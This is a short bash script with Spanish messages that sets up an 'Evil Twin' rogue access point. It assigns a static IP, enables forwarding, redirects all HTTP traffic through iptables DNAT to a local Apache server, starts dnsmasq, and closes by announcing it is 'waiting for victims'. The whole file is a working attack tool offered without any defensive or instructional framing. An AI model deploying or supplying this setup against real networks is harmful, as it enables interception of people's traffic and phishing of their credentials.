#!/bin/bash

echo "[+] Configurando IP estática en eth0..."
ip addr flush dev eth0
ip addr add 192.168.0.1/24 dev eth0

echo "[+] Habilitando IP Forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[+] Configurando iptables para redirección..."
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 192.168.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

echo "[+] Iniciando Apache..."
systemctl restart apache2

echo "[+] Iniciando dnsmasq con configuración local..."
dnsmasq -C ./dnsmasq.conf

echo "[+] Evil Twin listo en el router. Esperando víctimas..."